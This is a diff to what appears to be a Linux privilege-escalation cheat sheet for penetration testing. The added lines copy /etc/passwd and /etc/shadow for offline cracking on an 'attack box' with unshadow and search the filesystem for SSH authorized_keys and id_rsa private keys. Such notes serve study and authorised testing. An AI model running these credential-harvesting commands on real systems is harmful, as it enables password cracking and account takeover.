@@ -148,6 +148,15 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 su root
 ```
+##### Unshadow method 
+````
+cat /etc/passwd > passwd.txt
+cat /etc/shadow > shadow.txt
+````
+- Transfer both back to attack box 
+````
+unshadow passwd.txt shadow.txt > unshadowed.txt
+````
 #### Writeable shadow
 ```
 ls -l /etc/shadow
@@ -209,6 +218,8 @@ su root
 - Look for hidden files & directories in the system root:
 ````
 ls -la /
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
 ````
 ### Sudo-Shell escape Sequences
 - List the programs which sudo allows your user to run:
